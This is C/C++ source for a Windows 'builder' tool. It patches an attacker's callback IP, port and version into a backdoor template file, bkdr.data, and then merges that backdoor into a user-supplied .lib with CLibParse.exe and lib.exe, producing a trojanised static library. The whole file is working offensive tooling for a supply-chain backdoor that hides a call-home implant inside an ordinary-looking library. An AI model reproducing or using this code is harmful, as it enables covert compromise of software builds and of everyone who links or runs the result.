#include <Windows.h>
#include <stdio.h>
#include <string.h>

/*
Builder:
	<上线IP> 
	<上线Port>
	<Version>
	<lib 文件>
*/


void *memmem(const void *haystack, size_t haystacklen,
	const void *needle, size_t needlelen)
{
	const char* cur;
	const char* last;

	last = (char*)haystack + haystacklen - needlelen;
	for (cur = (char*)haystack; cur <= last; ++cur) {
		if (cur[0] == ((char*)needle)[0] &&
			memcmp(cur, needle, needlelen) == 0) {
			return (void*)cur;
		}
	}
	return NULL;
}

char szServerAddr[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
char szServerPort[0x100] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
char szVersion[0x100] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";

void ModifyBackdoor(const char * IP, const char* Port, const char*Version){
	TCHAR Backdoor[0x200] = { 0 };
	char aBackdoor[0x200] = { 0 };

	FILE* fp = NULL;
	size_t len = 0;
	DWORD dwPort = 0;
	char * inBackdoor = NULL;
	char * target = NULL;

	GetModuleFileName(NULL, Backdoor, 0x200);
	TCHAR *pName = Backdoor + lstrlen(Backdoor) - 1;
	while (pName > Backdoor && *pName != '\\')
		pName--;
	++pName;

	lstrcpy(pName, TEXT("bkdr.data"));
	WideCharToMultiByte(CP_ACP, 0, Backdoor, lstrlen(Backdoor),
		aBackdoor, 0x200, NULL, NULL);

	fp = fopen(aBackdoor, "rb");
	if (!fp){
		printf("Could open %s \n", aBackdoor);
		exit(-1);
	}
	//
	fseek(fp, 0, SEEK_END);
	len = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	inBackdoor = new char[len];
	fread(inBackdoor, 1, len, fp);
	fclose(fp);
	////修改字符串.

	//写IP
	target = (char*)memmem(inBackdoor, len, szServerAddr, strlen(szServerAddr));
	if (!target){
		printf("Count find ServerAddr in bkdr.data!\n");
		exit(-2);
	}
	memset(target, 0, strlen(target));
	strcpy(target, IP);
	printf("Write IP address successed!\n");
	
	//写端口号.
	target = (char*)memmem(inBackdoor, len, szServerPort, strlen(szServerPort));
	if (!target){
		printf("Count find ServerPort in bkdr.data!\n");
		exit(-2);
	}
	memset(target, 0, strlen(target));
	dwPort = atoi(Port);
	memcpy(target, &dwPort,sizeof(dwPort));
	printf("Write Port successed!\n");
	///
	target = (char*)memmem(inBackdoor, len, szVersion, strlen(szVersion));
	if (!target){
		printf("Count find Version in bkdr.data!\n");
		exit(-2);
	}
	memset(target, 0, strlen(target));
	strcpy(target, Version);
	printf("Write Version successed!\n");
	
	GetTempPathA(0x200, aBackdoor);
	strcat(aBackdoor, "\\");
	strcat(aBackdoor, "temp_backdoor_lib.lib");

	fp = fopen(aBackdoor, "wb");
	if (!fp){
		printf("Could not open %s \n",aBackdoor);
		exit(-3);
	}
	fwrite(inBackdoor, 1, len, fp);
	fclose(fp);

	delete[] inBackdoor;
}

#define BUF_SIZE 0x200

int main(int argc,char * argv[]){	
	DWORD ExitCode = 0;
	TCHAR  szTempLibPath[0x200];
	TCHAR  szCommandLine[0x200];
	TCHAR  szReleaseLib[0x200];
	TCHAR LibExePath[0x200] = { 0 };
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	TCHAR ParseExePath[0x200] = { 0 };
	TCHAR OutLibPath[0x200] = { 0 };
	TCHAR *pName = NULL;

	if (argc != 6)
	{
		printf("Usage: %s <IP> <Port> <Version> <Input Lib Path> <Output Lib Path>\n",
			argv[0]);
	
		system("pause");
		exit(1);
	}

	printf("[*] Begin add symbol to lib file\n");
	GetEnvironmentVariable(TEXT("TEMP"), szTempLibPath, 0x200);
	lstrcat(szTempLibPath, TEXT("\\LibInject.temp.lib"));
	/////

	GetModuleFileName(NULL, ParseExePath, 0x200);
	pName = ParseExePath + lstrlen(ParseExePath) - 1;
	while (pName > ParseExePath && *pName != '\\')
		pName--;
	++pName;
	lstrcpy(pName, TEXT("CLibParse.exe"));
	//
	TCHAR szInputPath[0x200] = { 0 };
	MultiByteToWideChar(CP_ACP, 0, argv[4], strlen(argv[4]), szInputPath, 0x200);
	wsprintfW(szCommandLine, TEXT(" %s %s"), szInputPath, szTempLibPath);

	if (!CreateProcess(ParseExePath, szCommandLine, NULL, NULL,
		FALSE, NULL, NULL, NULL, &si, &pi)){
		printf("CreateProcess failed with error : %d\n",GetLastError());
		
		exit(-1);
	}

	WaitForSingleObject(pi.hProcess,INFINITE);
	
	GetExitCodeProcess(pi.hProcess, &ExitCode);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	
	if (ExitCode){
		printf("Inject Lib Failed!\n");
		exit(-3);
	}
	printf("[*] Add Symbol To %s Successed!\n\n", argv[4]);
	//

	printf("[*] begin modify backdoor lib data\n");
	ModifyBackdoor(argv[1], argv[2], argv[3]);
	printf("[*] Modify backdoor lib data successed!\n");


	//删除旧文件.
	printf("[*] Delete old files\n");

	GetEnvironmentVariable(TEXT("TEMP"), szReleaseLib, 0x200);
	lstrcat(szReleaseLib, TEXT("\\"));
	lstrcat(szReleaseLib, TEXT("LibInject.temp.lib"));
	//DeleteFile(szReleaseLib);

	GetEnvironmentVariable(TEXT("TEMP"), szReleaseLib, 0x200);
	lstrcat(szReleaseLib, TEXT("\\"));
	lstrcat(szReleaseLib, TEXT("temp_backdoor_lib.lib"));
	//DeleteFile(szReleaseLib);

	//调用lib程序合并两个lib文件:
	printf("[*] Merge lib file\n");
	lstrcpy(szCommandLine, 
		TEXT(" /out:release_lib.lib LibInject.temp.lib temp_backdoor_lib.lib"));

	GetModuleFileName(NULL, LibExePath, 0x200);
	pName = LibExePath + lstrlen(LibExePath) - 1;
	while (pName > LibExePath && *pName != '\\')
		pName--;
	++pName;
	lstrcpy(pName, TEXT("lib.exe"));
	
	///
	GetEnvironmentVariable(TEXT("TEMP"), szReleaseLib, 0x200);

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	if (!CreateProcess(LibExePath, szCommandLine,
		NULL, NULL, FALSE, NULL, NULL, szReleaseLib, &si, &pi)){
		wprintf(TEXT("CreateProcess %s failed with error: %d\n"), LibExePath, GetLastError());
		exit(-1);
	}
	printf("Create Process Success!");
	ExitCode = 0;
	WaitForSingleObject(pi.hProcess, INFINITE);

	GetExitCodeProcess(pi.hProcess, &ExitCode);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	
	if (ExitCode){
		printf("Merge Lib failed!\n");
		exit(-3);
	}
	printf("[*] Merge lib successed\n");

	GetEnvironmentVariable(TEXT("TEMP"), szReleaseLib, 0x200);
	lstrcat(szReleaseLib, TEXT("\\release_lib.lib"));

	MultiByteToWideChar(CP_ACP, 0, argv[5], strlen(argv[5]), OutLibPath, 0x200);
	//删除已经存在的文件
	DeleteFile(OutLibPath);
	if (!CopyFile(szReleaseLib, OutLibPath,TRUE)){
		printf("CopyFile failed with error: %d\n", GetLastError());
		exit(-1);
	}
	printf("[*] Build Successed!");
	return 0;
}